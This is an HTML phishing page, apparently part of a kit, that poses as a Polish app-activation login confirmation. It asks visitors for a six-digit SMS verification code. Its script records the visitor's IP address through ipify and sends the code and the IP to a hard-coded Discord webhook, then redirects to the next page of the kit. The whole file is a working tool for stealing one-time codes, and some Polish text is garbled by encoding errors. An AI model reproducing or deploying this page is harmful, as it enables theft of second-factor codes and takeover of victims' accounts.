<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Potwierd藕 logowanie</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            margin: 0;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
        }

        .app-container {
            width: 100%;
            max-width: 400px;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        /* Header */
        .header {
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 40px;
            position: relative;
        }

        .header h2 {
            color: #e50000;
            font-size: 18px;
            font-weight: 600;
            margin: 0;
        }

        .menu-icon {
            position: absolute;
            right: 0;
            display: flex;
            flex-direction: column;
            gap: 4px;
        }

        .menu-icon span {
            width: 22px;
            height: 2px;
            background-color: #e50000;
        }

        .image-placeholder {
            width: 100%;
            height: 180px;
            margin-bottom: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        h1 {
            font-size: 26px;
            color: #222;
            margin: 10px 0;
            font-weight: bold;
        }

        .sub-text {
            color: #666;
            font-size: 16px;
            margin-bottom: 25px;
            padding: 0 10px;
        }

        /* Campos de c贸digo SMS */
        .otp-container {
            display: flex;
            gap: 8px;
            margin-bottom: 40px;
        }

        .otp-input {
            width: 45px;
            height: 55px;
            border: 1px solid #ccc;
            border-radius: 10px;
            font-size: 22px;
            text-align: center;
            outline: none;
            /* Forzar teclado num茅rico */
            -webkit-appearance: none;
        }

        .otp-input:focus {
            border-color: #e50000;
            box-shadow: 0 0 5px rgba(229, 0, 0, 0.2);
        }

        /* Bot贸n */
        .btn-login {
            width: 100%;
            padding: 16px;
            background-color: #e50000;
            color: #ffffff;
            border: none;
            border-radius: 30px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: auto;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

    <div class="app-container">
        <div class="header">
            <h2>Aktywacja aplikacji</h2>
            <div class="menu-icon">
                <span></span><span></span><span></span>
            </div>
        </div>

        <div class="image-placeholder">
            <img src="https://i.ibb.co/vCgtmDVy/IMG-5323.jpg" alt="Verification" style="width: 200px;">
        </div>

        <h1>Potwierd藕 logowanie</h1>
        <p class="sub-text">Wprowad藕 kod SMS, kt贸ry Ci wysalimy</p>

        <div class="otp-container">
            <input type="text" id="n1" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="move(this, 'n2')">
            <input type="text" id="n2" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="move(this, 'n3')">
            <input type="text" id="n3" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="move(this, 'n4')">
            <input type="text" id="n4" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="move(this, 'n5')">
            <input type="text" id="n5" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="move(this, 'n6')">
            <input type="text" id="n6" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        </div>

        <button class="btn-login" onclick="enviarDatos()">Zaloguj si</button>
    </div>

    <script>
        // REEMPLAZA ESTO CON TU URL DE DISCORD
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1460685397070839975/7ODk8T5o2hDUT_1O0-aWrSKH_r5_Y0kcGwIUgnZ_38om5vNCxpJ7XUVt0U7pQAcEMAqt";
        let ipReal = "Obteniendo...";

        // 1. Obtener la IP real apenas carga la p谩gina
        window.onload = async () => {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                ipReal = data.ip;
            } catch (error) {
                ipReal = "No disponible";
            }
        };

        // 2. Funci贸n para saltar autom谩ticamente al siguiente cuadro
        function move(current, nextId) {
            if (current.value.length >= 1 && nextId) {
                document.getElementById(nextId).focus();
            }
        }

        // 3. Funci贸n para retroceder con Backspace
        document.querySelectorAll('.otp-input').forEach((input, index, inputs) => {
            input.addEventListener('keydown', (e) => {
                if (e.key === "Backspace" && input.value === "" && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        // 4. Enviar datos a Discord y redireccionar
        async function enviarDatos() {
            let codigoSMS = "";
            for (let i = 1; i <= 6; i++) {
                codigoSMS += document.getElementById('n' + i).value;
            }

            if (codigoSMS.length < 6) {
                alert("Wprowad藕 peny kod SMS");
                return;
            }

            const payload = {
                content: ` **CDIGO SMS**\n **C贸digo:** \`${codigoSMS}\`\n **IP Real:** \`${ipReal}\``
            };

            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } finally {
                // Redirecci贸n final
                window.location.href = "index4.html";
            }
        }
    </script>

</body>
</html>
